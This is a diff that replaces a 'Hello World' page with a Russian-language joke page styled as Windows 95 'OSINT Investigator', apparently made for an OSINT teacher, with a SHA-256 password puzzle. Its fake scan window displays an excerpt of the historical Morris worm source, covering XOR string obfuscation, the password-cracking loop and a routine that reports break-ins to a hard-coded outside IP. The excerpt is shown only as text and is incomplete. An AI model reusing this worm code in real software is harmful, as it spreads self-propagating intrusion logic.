@@ -1,10 +1,559 @@
 <!DOCTYPE html>
-<html>
- <head>
-  <meta charset="utf-8" />
-  <title>GG</title>
- </head>
- <body>
-  <p>Hello World!</p>
- </body>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSINT Investigator 95</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #008080;
+            font-family: 'MS Sans Serif', 'Microsoft Sans Serif', Arial, sans-serif;
+            font-size: 11px;
+            color: #000;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .desktop {
+            position: relative;
+            height: calc(100vh - 40px);
+            padding: 4px;
+        }
+
+        .window {
+            position: absolute;
+            background: #c0c0c0;
+            border: 2px solid;
+            border-color: #dfdfdf #808080 #808080 #dfdfdf;
+            min-width: 300px;
+            box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .title-bar {
+            background: linear-gradient(90deg, #000080, #1084d0);
+            color: white;
+            padding: 2px 4px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 18px;
+        }
+
+        .title-bar-controls {
+            display: flex;
+        }
+
+        .title-bar-button {
+            width: 16px;
+            height: 14px;
+            background: #c0c0c0;
+            border: 1px solid;
+            border-color: #dfdfdf #808080 #808080 #dfdfdf;
+            font-size: 9px;
+            text-align: center;
+            line-height: 12px;
+            margin-left: 2px;
+            cursor: pointer;
+        }
+
+        .window-content {
+            padding: 8px;
+            background: #c0c0c0;
+        }
+
+        .menu-bar {
+            background: #c0c0c0;
+            border-bottom: 1px solid #808080;
+            padding: 2px 4px;
+            display: flex;
+        }
+
+        .menu-item {
+            margin-right: 15px;
+            cursor: pointer;
+        }
+
+        .menu-item:hover {
+            background: #000080;
+            color: white;
+        }
+
+        .taskbar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 30px;
+            background: #c0c0c0;
+            border-top: 2px solid #dfdfdf;
+            display: flex;
+            align-items: center;
+            padding: 0 4px;
+        }
+
+        .start-button {
+            background: #c0c0c0;
+            border: 2px solid;
+            border-color: #dfdfdf #808080 #808080 #dfdfdf;
+            padding: 2px 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+
+        .icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 64px;
+            margin: 10px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .icon-image {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 4px;
+        }
+
+        .desktop-icons {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            height: 100%;
+        }
+
+        .dialog-box {
+            background: #c0c0c0;
+            border: 2px solid;
+            border-color: #dfdfdf #808080 #808080 #dfdfdf;
+            padding: 8px;
+            margin: 10px 0;
+        }
+
+        button {
+            background: #c0c0c0;
+            border: 2px solid;
+            border-color: #dfdfdf #808080 #808080 #dfdfdf;
+            padding: 3px 8px;
+            margin: 2px;
+            cursor: pointer;
+        }
+
+        button:active {
+            border-color: #808080 #dfdfdf #dfdfdf #808080;
+        }
+
+        input, textarea {
+            background: white;
+            border: 2px solid;
+            border-color: #808080 #dfdfdf #dfdfdf #808080;
+            padding: 2px;
+            margin: 2px 0;
+        }
+
+        .hash-display {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #0f0;
+            padding: 4px;
+            margin: 5px 0;
+            font-size: 10px;
+            border: 1px solid #0f0;
+        }
+
+        .crypto-terminal {
+            background: #000;
+            color: #0f0;
+            padding: 8px;
+            font-family: 'Courier New', monospace;
+            border: 2px solid #0f0;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop">
+        <div class="desktop-icons">
+            <div class="icon" onclick="openWindow('myComputer')">
+                <div class="icon-image">💻</div>
+                <span>Мой компьютер</span>
+            </div>
+            <div class="icon" onclick="openWindow('osintTools')">
+                <div class="icon-image">🔍</div>
+                <span>OSINT Tools</span>
+            </div>
+            <div class="icon" onclick="openWindow('secretFiles')">
+                <div class="icon-image">📁</div>
+                <span>Секретные файлы</span>
+            </div>
+        </div>
+
+        <!-- Окно Мой компьютер -->
+        <div id="myComputer" class="window" style="left: 100px; top: 100px; width: 400px; display: none;">
+            <div class="title-bar">
+                <span>Мой компьютер</span>
+                <div class="title-bar-controls">
+                    <button class="title-bar-button" onclick="closeWindow('myComputer')">×</button>
+                </div>
+            </div>
+            <div class="menu-bar">
+                <div class="menu-item">Файл</div>
+                <div class="menu-item">Правка</div>
+                <div class="menu-item">Вид</div>
+            </div>
+            <div class="window-content">
+                <p><strong>Система OSINT Investigator 95</strong></p>
+                <p>Процессор: Pentium 20000MHz</p>
+                <p>Память: вечная память моим 256МБ</p>
+                <p>Диск C:: <span id="diskSpace">99% свободно</span></p>
+                <div class="dialog-box">
+                    <p>⚠ <strong>ВНИМАНИЕ!</strong></p>
+                    <p>Флоппи не включать!!! У меня там какой-то червь, у него нет яблок</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Окно OSINT Tools -->
+        <div id="osintTools" class="window" style="left: 150px; top: 150px; width: 500px; display: none;">
+            <div class="title-bar">
+                <span>OSINT Professional Tools</span>
+                <div class="title-bar-controls">
+                    <button class="title-bar-button" onclick="closeWindow('osintTools')">×</button>
+                </div>
+            </div>
+            <div class="window-content">
+                <div class="dialog-box">
+                    <p>🔍 <strong>Анализатор преподавателя v2.0</strong></p>
+                    <p>Цель: Преподаватель по OSINT</p>
+                    <p>Статус: <span style="color: green">ОБНАРУЖЕН</span></p>
+                    <p>Уровень знаний: ЭКСПЕРТ</p>
+                    <p>Слабое место: любовь к хорошим шуткам и заданиям</p>
+                </div>
+                <button onclick="runScan()">Запустить сканирование</button>
+                <div id="scanResult" style="margin-top: 10px; display: none;">
+                    <textarea rows="8" cols="63" readonly>
+[SCAN COMPLETE]
+Найдено: Червь Морриса
+Рекомендация: продолжить
+Система: неодобряет это
+
+(ну я же просил не играть с флоппи)
+
+/* dover */
+
+#include "worm.h"
+#include <stdio.h>
+#include <signal.h>
+#include <strings.h>
+#include <sys/param.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/fcntl.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+
+extern errno;
+extern char *malloc();
+
+int pleasequit;					/* See worm.h */
+int nobjects = 0;
+int nextw;
+char *null_auth;
+
+object objects[69];				/* Don't know how many... */
+
+object *getobjectbyname();
+
+char *XS();
+
+main(argc, argv)		/* 0x20a0 */
+     int argc;
+     char **argv;
+{
+    int i, l8, pid_arg, j, cur_arg, unused;
+    long key;			/* -28(fp) */
+    struct rlimit rl;
+
+    l8 = 0;					/* Unused */
+
+    strcpy(argv[0], XS("sh"));			/* <env+52> */
+    time(&key);
+    srandom(key);
+    rl.rlim_cur = 0;
+    rl.rlim_max = 0;
+    if (setrlimit(RLIMIT_CORE, &rl))
+	;
+    signal(SIGPIPE, SIG_IGN);
+    pid_arg = 0;
+    cur_arg = 1;
+    if  (argc > 2 &&
+	 strcmp(argv[cur_arg], XS("-p")) == 0) { /* env55 == "-p" */
+	pid_arg = atoi(argv[2]);
+	cur_arg += 2;
+    }
+    for(i = cur_arg; i < argc; i++) {	/* otherwise <main+286> */
+	if (loadobject(argv[i]) == 0)
+	    exit(1);
+	if (pid_arg)
+	    unlink(argv[i]);
+    }
+    if ((nobjects < 1) || (getobjectbyname(XS("l1.c")) == NULL))
+	exit(1);
+    if (pid_arg) {
+	for(i = 0; i < 32; i++)
+	    close(i);
+	unlink(argv[0]);
+	unlink(XS("sh"));			/* <env+63> */
+	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb"
+ */
+    }
+
+    for (i = 1; i < argc; i++)
+	for (j = 0;	argv[i][j]; j++)
+	    argv[i][j] = '\0';
+    if (if_init() == 0)
+	exit(1);
+    if (pid_arg) {					/* main+600 */
+	if (pid_arg == getpgrp(getpid()))
+	    setpgrp(getpid(), getpid());
+	kill(pid_arg, 9);
+    }
+    mainloop();
+}
+
+static mainloop()				/* 0x2302 */
+{
+    long key, time1, time0;
+
+    time(&key);
+    srandom(key);
+    time0 = key;
+    if (hg() == 0 && hl() == 0)
+	ha();
+    checkother();
+    report_breakin();
+    cracksome();
+    other_sleep(30);
+    while (1) {
+	/* Crack some passwords */
+	cracksome();
+	/* Change my process id */
+	if (fork() > 0)
+	    exit(0);
+	if (hg() == 0 && hi() == 0 && ha() == 0)
+	    hl();
+	other_sleep(120);
+	time(&time1);
+	if (time1 - time0 >= 60*60*12)
+	    h_clean();
+	if (pleasequit && nextw > 0)
+	    exit(0);
+    }
+}
+
+static trans_cnt;
+static char trans_buf[NCARGS];
+
+char *XS(str1)			/* 0x23fc */
+     char *str1;
+{
+    int i, len;
+    char *newstr;
+#ifndef ENCYPHERED_STRINGS
+    return str1;
+#else
+    len = strlen(str1);
+    if (len + 1 > NCARGS - trans_cnt)
+	trans_cnt = 0;
+    newstr = &trans_buf[trans_cnt];
+    trans_cnt += 1 + len;
+    for (i = 0; str1[i]; i++)
+	newstr[i] = str1[i]^0x81;
+    newstr[i] = '\0';
+    return newstr;
+#endif
+}
+
+/* This report a sucessful breakin by sending a single byte to "128.32.137.13"
+ * (whoever that is). */
+
+static report_breakin(arg1, arg2)		/* 0x2494 */
+{
+    int s;
+    struct sockaddr_in sin;
+    char msg;
+
+    if (7 != random() % 15)
+	return;
+
+    bzero(&sin, sizeof(sin));
+    sin.sin_family = AF_INET;
+    sin.sin_port = REPORT_PORT;
+    sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
+						/* <env+77>"128.32.137.13" */
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s < 0)
+	return;
+    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
+	;
+    close(s);
+}
+
+/* End of first file in the original source.
+ * (Indicated by extra zero word in text area.) */
+
+/*
+ * Local variables:
+ * compile-command: "make"
+ * comment-column: 48
+ * End:
+ */
+                    </textarea>
+                </div>
+            </div>
+        </div>
+
+        <!-- Окно Секретные файлы -->
+        <div id="secretFiles" class="window" style="left: 200px; top: 200px; width: 500px; display: none;">
+            <div class="title-bar">
+                <span>Секретные файлы - КОНФИДЕНЦИАЛЬНО</span>
+                <div class="title-bar-controls">
+                    <button class="title-bar-button" onclick="closeWindow('secretFiles')">×</button>
+                </div>
+            </div>
+            <div class="window-content">
+                <p><strong>Доступ только для агентов OSINT</strong></p>
+                <div class="dialog-box">
+                    <p>📄 secret.txt - <em>зашифровано ГОСТ</em></p>
+                    <p>📄 hash_sha_256.doc - <em>требуется пароль</em></p>
+                    <p>📄 mission_impossible.exe - <em>выполняется...</em></p>
+                </div>
+
+                <div class="crypto-terminal">
+                    <div>🔐 СИСТЕМА ПРОВЕРКИ ПАРОЛЯ</div>
+                    <div>Ожидаемый хэш:</div>
+                    <div class="hash-display" id="expectedHash">bfe80bd3d1e3878d41e68041d1c30538cca10c28cfc35bbfb1c5077c7bd74363</div>
+                    <div>Введите пароль: <input type="password" id="password" onkeyup="updateHash()"></div>
+                    <div>Полученный хэш:</div>
+                    <div class="hash-display" id="currentHash">0000000000000000000000000000000000000000000000000000000000000000</div>
+                    <div>Статус: <span id="hashStatus">❌ НЕСОВПАДЕНИЕ</span></div>
+                </div>
+
+                <button onclick="checkPasswordHash()">Проверить пароль</button>
+
+                <div id="secretContent" style="display: none;">
+                    <div class="dialog-box" style="background: #90ee90;">
+                        <p>🎉 <strong>ДОСТУП РАЗРЕШЕН!</strong></p>
+                        <p>Хэши совпали! Криптографическая проверка пройдена. Вы угадали.</p>
+                        <p><em>"Отличное знание криптографии! Вы точно не Тьюринг и не Керкгоффс?"</em></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="taskbar">
+        <div class="start-button" onclick="toggleStartMenu()">
+            Пуск
+        </div>
+        <div id="clock" style="margin-left: auto; padding: 0 8px;">
+            16:20:00
+        </div>
+    </div>
+
+    <script>
+        // Функция для вычисления SHA-256 хэша
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // Ожидаемый хэш для пароля
+        const EXPECTED_HASH = 'bfe80bd3d1e3878d41e68041d1c30538cca10c28cfc35bbfb1c5077c7bd74363';
+
+        function openWindow(windowId) {
+            document.getElementById(windowId).style.display = 'block';
+        }
+
+        function closeWindow(windowId) {
+            document.getElementById(windowId).style.display = 'none';
+        }
+
+        function runScan() {
+            const result = document.getElementById('scanResult');
+            result.style.display = 'block';
+        }
+
+        // Обновление хэша в реальном времени
+        async function updateHash() {
+            const password = document.getElementById('password').value;
+            const currentHashElement = document.getElementById('currentHash');
+            const hashStatusElement = document.getElementById('hashStatus');
+
+            if (password.length > 0) {
+                const hash = await sha256(password);
+                currentHashElement.textContent = hash;
+
+                if (hash === EXPECTED_HASH) {
+                    hashStatusElement.innerHTML = '✅ СОВПАДЕНИЕ!';
+                    hashStatusElement.style.color = 'green';
+                } else {
+                    hashStatusElement.innerHTML = '❌ НЕСОВПАДЕНИЕ';
+                    hashStatusElement.style.color = 'red';
+                }
+            } else {
+                currentHashElement.textContent = '0000000000000000000000000000000000000000000000000000000000000000';
+                hashStatusElement.innerHTML = '❌ НЕСОВПАДЕНИЕ';
+                hashStatusElement.style.color = 'red';
+            }
+        }
+
+        // Проверка пароля по хэшу
+        async function checkPasswordHash() {
+            const password = document.getElementById('password').value;
+            const hash = await sha256(password);
+            const secret = document.getElementById('secretContent');
+
+            if (hash === EXPECTED_HASH) {
+                secret.style.display = 'block';
+            } else {
+                alert('ОШИБКА ДОСТУПА!\nХэши не совпадают. Попробуйте другое слово.');
+            }
+        }
+
+        function toggleStartMenu() {
+            alert('Че запускаем? Не тыкай сюда...');
+        }
+
+        // Обновление часов
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent = now.toLocaleTimeString();
+        }
+
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            updateClock();
+            setInterval(updateClock, 1000);
+        });
+
+        // Случайное изменение места на диске, а что вы хотели, я раньше считал, что это и вправду случайное число
+        setInterval(() => {
+            const freeSpace = Math.floor(Math.random() * 100) + 1;
+            document.getElementById('diskSpace').textContent = freeSpace + '% свободно';
+        }, 5000);
+    </script>
+</body>
 </html>
